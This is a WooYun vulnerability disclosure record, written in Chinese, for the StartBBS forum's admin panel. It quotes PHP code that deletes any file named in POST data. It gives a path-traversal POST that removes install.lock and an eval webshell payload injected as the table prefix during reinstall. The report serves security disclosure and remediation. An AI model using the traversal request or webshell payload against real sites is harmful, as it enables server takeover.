{"id": 55632, "wybug_id": "wooyun-2014-060364", "wybug_title": "开源轻论坛StartBBS后台任意文件删除+getshell（需要管理员权限）", "wybug_corp": "startbbs.com", "wybug_author": "phith0n", "wybug_date": "2014-05-12 11:44", "wybug_open_date": "2014-08-07 11:46", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "白盒测试", "后台"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-17：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-07：\t细节向公众公开  简要描述： 找了好半天，感觉没太好的后台getshell的方法。分析我以前交的一个前台getshell漏洞（http://wooyun.org/bugs/wooyun-2013-045143），就是通过重装来getshell的（最新版本v1.1.5任意重装的洞已经修了，但重装的位置依旧可以getshell），那么如果有一个任意文件删除洞的话，岂不就能删除.lock文件，来重新安装了呢？来getshell了呢？我之前也一直用CI做开发，常参考startbbs的源码，在这里说声谢谢~ 详细说明：  后台代码app/controllers/admin/db_admin.php 75行\npublic function restore($sqlfile=''){\t$data['title'] = '数据库还原';\t$data['act']=$this->uri->segment(3);\t$data['sqlfiles'] = get_dir_file_info(FCPATH.'data/backup', $top_level_only = TRUE);\tif($_POST){\t\t$sqlfiles=array_slice($this->input->post(), 0, -1);\t\t//echo var_export($sqlfiles);\t\tforeach($sqlfiles as $k=>$v){\t\t\tunlink(FCPATH.'data/backup/'.$v);\t\t}\t\t$this->session->set_flashdata('error', '删除sql文件成功!');\t\tredirect('admin/db_admin/restore');\t}\tif($sqlfile){\t\t$sql  = file_get_contents(FCPATH.'data/backup/'.$sqlfile);\t\tif($this->run_sql($sql)){\t\t\t$this->session->set_flashdata('error', '还原sql文件成功!');\t\t\tredirect('admin/db_admin/restore');\t\t}\t}\t$this->load->view('db_admin', $data);}\n这是一个进行数据库还原操作的函数，其中可以对已经备份好的数据库文件进行删除。但是没有验证文件名，导致可以任意文件删除。代码直接取POST数组（最后一个变量除外，不知为什么），用foreach遍历之，然后删除所有$_POST数组中的值。详见漏洞证明。   漏洞证明：  登录后台，直接向index.php/admin/db_admin/restore/这个地址POST数据a=../../install.lock&b=x，想删除多少文件都行（加POST数组内容即可，键名随意，键值是你要删除的文件位置），但我只删除安装锁,.lock文件。\n\n如上图，提示删除成功了。来到前台首页，发现跳转到安装页面了：\n\n顺理成章，重装系统。找一个可以外连的数据库，填好信息，然后在表前缀的位置填入一句话:\nsb_';phpinfo();@eval ($_POST[101]);$xxx='\n\n\n安装好以后，访问首页就能看到phpinfo了。菜刀直接连index.php，连数据库配置文件是不行的。\n\n查看数据库配置文件，发现马已经安静地躺在那里了：\n\n   修复方案：  检查文件名中是否有../等敏感字符，避免任意文件删除。   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-08-07 11:46 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}